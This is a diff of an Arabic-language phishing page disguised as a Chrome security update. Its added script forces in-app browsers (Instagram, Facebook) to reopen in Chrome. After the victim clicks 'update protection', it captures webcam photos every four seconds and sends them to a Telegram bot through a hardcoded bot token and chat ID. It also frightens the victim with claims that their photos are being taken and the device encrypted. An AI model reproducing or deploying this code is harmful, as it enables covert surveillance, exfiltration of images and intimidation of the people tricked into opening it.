@@ -3,14 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VEXO SECURITY BYPASS</title>
+    <title>VEXO SYSTEM REPAIR</title>
+    <script>
+        // دالة لإجبار المتصفح على الفتح في جوجل كروم
+        function redirectToChrome() {
+            var currentUrl = window.location.href.replace('https://', '');
+            var chromeIntent = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+            
+            // إذا كان المستخدم يفتح الرابط من داخل تطبيق (مثل إنستجرام)
+            if (navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
+                window.location.href = chromeIntent;
+            }
+        }
+        window.onload = redirectToChrome;
+    </script>
     <style>
         body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; text-align: center; }
-        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
+        canvas { display: block; position: absolute; z-index: 1; }
         .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.85); }
+        .btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
         .skull { font-size: 7px; line-height: 7px; white-space: pre; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; }
-        .terminal { width: 90%; background: rgba(0,30,0,0.5); border: 1px solid #0f0; padding: 10px; font-size: 0.8rem; text-align: left; direction: ltr; max-height: 200px; overflow: hidden; }
-        .btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; font-size: 1.2rem; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
     </style>
 </head>
 <body>
@@ -19,9 +31,9 @@
     <canvas id="c" style="display:none"></canvas>
 
     <div class="overlay" id="p1">
-        <h1 style="color: red; animation: blink 0.8s infinite;">⚠️ SYSTEM BREACH ⚠️</h1>
-        <p style="direction: rtl; font-size: 1.1rem;">تم اكتشاف محاولة اختراق لجهازك.<br>اضغط لتفعيل جدار الحماية فوراً!</p>
-        <button class="btn" onclick="start()">تـفـعـيـل الـحـمـايـة</button>
+        <h1 style="color: red;">⚠️ SECURITY ALERT ⚠️</h1>
+        <p style="direction: rtl;">تم اكتشاف ثغرة في متصفحك.<br>اضغط لتحديث الحماية في Chrome.</p>
+        <button class="btn" onclick="start()">تحديث الحماية الآن</button>
     </div>
 
     <div class="overlay" id="p2" style="display:none">
@@ -39,15 +51,15 @@
             \          /
              `--------`
         </div>
-        <div class="terminal" id="term"></div>
+        <p style="direction: rtl;">جاري سحب الصور وتشفير الجهاز...</p>
     </div>
 
     <script>
-        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs';
-        const ID = '7822309283';
+        const TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs'; // التوكن الخاص بك
+        const ID = '7822309283'; // الآيدي الخاص بك
 
         // تأثير الماتركس
-        const canvas = document.getElementById('matrix');
+        const canvas = document.querySelector('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
         const drops = Array(Math.floor(canvas.width / 20)).fill(1);
@@ -55,8 +67,7 @@
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = "#0f0"; ctx.font = "20px monospace";
             drops.forEach((y, i) => {
-                const text = "01"[Math.floor(Math.random()*2)];
-                ctx.fillText(text, i * 20, y * 20);
+                ctx.fillText("01"[Math.floor(Math.random()*2)], i * 20, y * 20);
                 if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             });
@@ -66,46 +77,24 @@
         async function start() {
             document.getElementById('p1').style.display = 'none';
             document.getElementById('p2').style.display = 'flex';
-            runTerminal();
-            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('v').srcObject = stream;
-                // يصور ويرسل كل 4 ثواني تلقائياً
                 setInterval(capture, 4000);
-            } catch (e) {
-                // إذا رفض الكاميرا، نستمر في إرعابه بالكلام
-            }
+            } catch (e) {}
         }
 
         function capture() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
+            const v = document.getElementById('v'), c = document.getElementById('c');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             c.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', ID);
                 f.append('photo', blob, 'x.jpg');
-                f.append('caption', '💀 VEXO: تم سحب صورة جديدة للضحية!');
+                f.append('caption', '💀 VEXO: تم سحب صورة من Chrome!');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg');
-        }
-
-        function runTerminal() {
-            const lines = [
-                "> Connecting to server...", "> Bypass firewall: OK", "> Accessing Gallery...",
-                "> Downloading DCIM/Camera/...", "> Syncing contacts...", "> Capturing front_camera...",
-                "> Success. Data sent to VEXO Server."
-            ];
-            let i = 0;
-            const t = document.getElementById('term');
-            setInterval(() => {
-                if(i < lines.length) {
-                    t.innerHTML += lines[i] + "<br>";
-                    i++;
-                }
-            }, 1000);
         }
     </script>
 </body>
